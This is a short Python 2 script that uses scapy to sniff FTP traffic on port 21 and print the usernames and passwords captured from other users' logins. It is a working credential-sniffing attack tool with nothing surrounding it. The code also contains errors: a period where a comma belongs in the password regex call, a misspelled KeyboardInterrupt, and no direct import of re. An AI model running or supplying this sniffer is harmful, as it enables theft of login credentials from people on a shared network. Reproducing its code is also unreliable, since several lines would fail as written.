import socket
import optparse
from scapy.all import *

def ftpSniff(pkt):
	dest = pkt.getlayer(IP).dst
	raw = pkt.sprintf("%Raw.load%")
	user = re.findall('(?i)USER (.*)',raw)	
	pswd = re.findall('(?i)PASS (.*)'.raw) 
	if user:
		print '[*] Detected login on Network: ' + str(dest)
		print '[+] User :  '+ str(user[0])
	elif pswd:
		print '[+] Password '+ str(pswd[0])

def main():
	parser = optparse.OptionParser("Usage of The Program: "+ "-i <interface>")
	parser.add_option("-i", dest = "interface", type="string", help="specify interface" )
	(options,args) = parser.parse_args()
	if options.interface == None:
		print parser.usage
		exit(0)
	else:
		conf.iface = options.interface
	try:
		sniff(filter="tcp port 21", prn=ftpSniff)
	except KeybordInterrupt:
		exit(0)
	
			
main()
